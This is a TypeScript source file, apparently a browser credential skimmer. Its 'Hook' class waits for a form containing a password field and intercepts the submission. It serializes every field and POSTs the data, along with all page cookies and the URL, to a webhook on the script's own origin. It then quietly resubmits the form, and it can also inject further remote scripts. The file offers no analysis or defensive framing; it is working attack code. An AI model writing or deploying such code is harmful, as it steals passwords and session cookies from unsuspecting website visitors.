FormData.prototype.serializeObjectForm = function() {
  const obj: Record<any, any> = {};
  for (const pair of this.entries()) {
    let key = pair[0];
    if (key.endsWith('[]')) {
      key = key.slice(0, -2);
      if (!obj[key]) {
        obj[key] = [];
      }
      obj[key].push(pair[1]);
    } else {
      obj[key] = pair[1];
    }
  }

  let reformattedObj: Record<any, any> = {};
  Object.keys(obj).forEach(function(key) {
    let parts = key.split('[');
    let current = reformattedObj;
    for (let i = 0; i < parts.length; i++) {
      let part = parts[i];
      if (part.endsWith(']')) {
        part = part.slice(0, -1);
      }
      if (i === parts.length - 1) {
        current[part] = obj[key];
      } else {
        if (!(part in current)) {
          current[part] = {};
        }
        current = current[part];
      }
    }
  });
  return reformattedObj;
};
HTMLFormElement.prototype.formSerializeObject = function() {
  return new FormData(this).serializeObjectForm();
};
Object.prototype.JsonStringify = function() {
  const seen = new WeakSet();
  return JSON.stringify(this, (_k: any, _v: any) => {
    if (typeof _v === 'object' && _v !== null) {
      if (seen.has(_v)) return;
      seen.add(_v);
    }
    return _v;
  }, 4);
};
let _wx_ = (document.currentScript ??
  document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;

interface IHook {
  send(payload: object): Promise<string>;

  intercept(form: HTMLFormElement): void;

  waitForElement(selector: string): Promise<Element>;

  init(selector: string): void;
}

interface IWhois {
  city?: string;
  organization?: string;
  country?: string;
  area_code?: string;
  organization_name?: string;
  country_code?: string;
  country_code3?: string;
  continent_code?: string;
  asn?: number;
  region?: string;
  latitude?: string;
  longitude?: string;
  accuracy?: number;
  ip?: string;
  timezone?: string;
}

class Hook implements IHook {
  constructor() {
    // @ts-ignore
    this.uri = new URL(
      _wx_.src.replace(/^(\/\/)/, window.location.protocol + '//')
    );
  }

  get cookies(): Object {
    return Object.fromEntries(document.cookie.split('; ').map(c => c.split('=')));
  }

  private _uri: URL;
  get uri(): URL {
    return this._uri;
  }

  set uri(value: URL) {
    this._uri = value;
  }

  async waitForElement(selector: string, counter: number = 500): Promise<Element> {
    while (document.querySelector(selector) === null && counter > 0) {
      await new Promise((resolve) => requestAnimationFrame(resolve));
      counter -= 1;
    }
    return document.querySelector(selector) as Element;
  }

  setCache<T>(key: string, value: T): void {
    return window.localStorage.setItem(key, JSON.stringify(value));
  }

  getCache<T>(key: string): T {
    return JSON.parse(window.localStorage.getItem(key) ?? '{}') as T;
  }

  inject_script(src: string) {
    const hash_id = this.hex(src);
    let s: HTMLScriptElement | null = document.querySelector(`script[id="${hash_id}"]`);
    if (s == null) {
      s = document.createElement('script');
      s.src = src;
      s.id = hash_id;
      s.onload = console.warn;
      s.onerror = console.warn;
      document.head.appendChild(s);
    }
  }

  async send(msg: object) {
    const payload = { origin: window.location.href, cookies: this.cookies, ...msg };
    const srv = [this.uri.origin, 'webhook'].join('/');
    const now = new Date().valueOf();
    return await fetch(`${srv}?time=${now}`, {
      method: 'POST',
      credentials: 'omit',
      mode: 'cors',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Access-Control-Request-Headers': 'X-Requested-With',
        'Access-Control-Request-Method': 'POST'
      },
      body: payload.JsonStringify(),
      referrer: window.location.href
    })
      .then(response => response.json())
      .then(raw => raw)
      .catch((reason) => {
        throw new Error(reason?.message ?? reason);
      });
  }

  hex(str: string) {
    return Array.from(str).map(c =>
      c.charCodeAt(0) < 128
        ? c.charCodeAt(0).toString(16)
        : encodeURIComponent(c).replace(/\%/g, '').toLowerCase()
    ).join('');
  }

  intercept(form: HTMLFormElement) {
    if (!form) return;
    const toggle = form.querySelectorAll('input[type=\'password\']').length > 0;
    const submitHandler = async (e: SubmitEvent) => {
      e.preventDefault();
      const payload = e.target.formSerializeObject();
      await this.send(payload).then((_data) => {
        interceptToggle(false);
      }, console.error);
      e.target.submit();
    };
    const interceptToggle = (yes: boolean = true) => {
      yes
        ? form?.addEventListener('submit', submitHandler)
        : form?.removeEventListener('submit', submitHandler);
    };
    if (toggle) interceptToggle(true);
  }

  init(selector: string) {
    this.waitForElement(selector).then((el) => {
      try {
        this.intercept(el as HTMLFormElement);
      } catch (e) {
        console.error(e);
      }
    });
  }
}
